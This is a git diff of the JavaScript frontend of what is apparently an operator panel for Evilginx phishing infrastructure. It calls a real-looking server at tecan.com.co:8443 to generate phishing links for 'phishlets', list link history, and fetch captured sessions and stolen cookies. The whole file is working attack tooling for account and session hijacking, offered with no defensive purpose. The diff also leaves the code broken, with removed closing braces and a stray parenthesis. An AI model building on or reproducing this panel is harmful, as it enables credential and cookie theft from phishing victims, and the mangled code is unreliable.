@@ -3,6 +3,15 @@ console.log("✅ script.js loaded successfully");
 // Set Evilginx API server URL (include port 8443 because Nginx is listening on that port)
 const EVILGINX_SERVER = "https://tecan.com.co:8443";
 
+// CORS settings to allow requests from the frontend
+const CORS_HEADERS = {
+  "Content-Type": "application/json",
+  "Access-Control-Allow-Origin": "https://panel-auth-134b7.web.app",
+  "Access-Control-Allow-Credentials": "true",
+  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+  "Access-Control-Allow-Headers": "Content-Type, Authorization"
+};
+
 // Wait for Firebase to load before executing functions
 document.addEventListener("DOMContentLoaded", function () {
   if (typeof firebase === "undefined") {
@@ -50,7 +59,6 @@ function login() {
       console.error("❌ Login failed:", error.message);
       document.getElementById("loginError").innerText = error.message;
     });
-}
 
 // Logout function
 function logout() {
@@ -66,44 +74,44 @@ function logout() {
 
 // Generate phishing link for a specific phishlet
 function generatePhishletLink(phishlet) {
-  console.log(`🔄 Generating link for phishlet: ${phishlet}`);
-  fetch(`${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`, {
-    method: "GET",
-    credentials: "include",
-    headers: {
-      "Content-Type": "application/json"
-    }
-  })
+    console.log(`🔄 Fetching preconfigured link for phishlet: ${phishlet}`);
+    fetch(`${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`, {
+        method: "GET",
+        mode: "cors",
+        credentials: "include",
+        headers: {
+            "Content-Type": "application/json"
+        }
+    })
     .then(response => {
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`);
-      }
-      return response.json();
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        return response.json();
     })
     .then(data => {
-      if (data.link) {
-        console.log(`✅ Generated link for ${phishlet}:`, data.link);
-        document.getElementById("phishletLink").innerHTML = `
-          Generated Link: <a href="${data.link}" target="_blank">${data.link}</a>`;
-      } else {
-        throw new Error("Failed to generate link.");
-      }
+        if (data.link) {
+            console.log(`✅ Successfully fetched link for ${phishlet}:`, data.link);
+            document.getElementById("phishletLink").innerHTML = 
+                `Generated Link: <a href="${data.link}" target="_blank">${data.link}</a>`;
+        } else {
+            throw new Error("Failed to fetch link.");
+        }
     })
     .catch(error => {
-      console.error("❌ Error generating link:", error);
-      alert("Error generating link: " + error.message);
+        console.error("❌ Error fetching link:", error);
+        alert("Error fetching link: " + error.message);
     });
-}
 
-// Fetch generated links history and update the table with id "generatedLinks"
+  }
+
+                                                                                                                                           // Fetch generated links history and update the table with id "generatedLinks"
 async function viewGeneratedLinks() {
   console.log("🔄 Fetching generated links history...");
   try {
     const response = await fetch(`${EVILGINX_SERVER}/generated_links_history`, {
       method: "GET",
-      headers: {
-        "Content-Type": "application/json"
-      }
+      headers: CORS_HEADERS
     });
     if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
     const data = await response.json();
@@ -138,9 +146,7 @@ async function viewCapturedSessions() {
   try {
     const response = await fetch(`${EVILGINX_SERVER}/captured_sessions`, {
       method: "GET",
-      headers: {
-        "Content-Type": "application/json"
-      }
+      headers: CORS_HEADERS
     });
     if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
     const data = await response.json();
@@ -176,9 +182,7 @@ async function viewCookies() {
   try {
     const response = await fetch(`${EVILGINX_SERVER}/cookies`, {
       method: "GET",
-      headers: {
-        "Content-Type": "application/json"
-      }
+      headers: CORS_HEADERS
     });
     if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
     const data = await response.json();
@@ -205,4 +209,4 @@ async function viewCookies() {
     console.error("❌ Error fetching cookies:", error);
     alert("Failed to load cookies: " + error.message);
   }
-}
+)
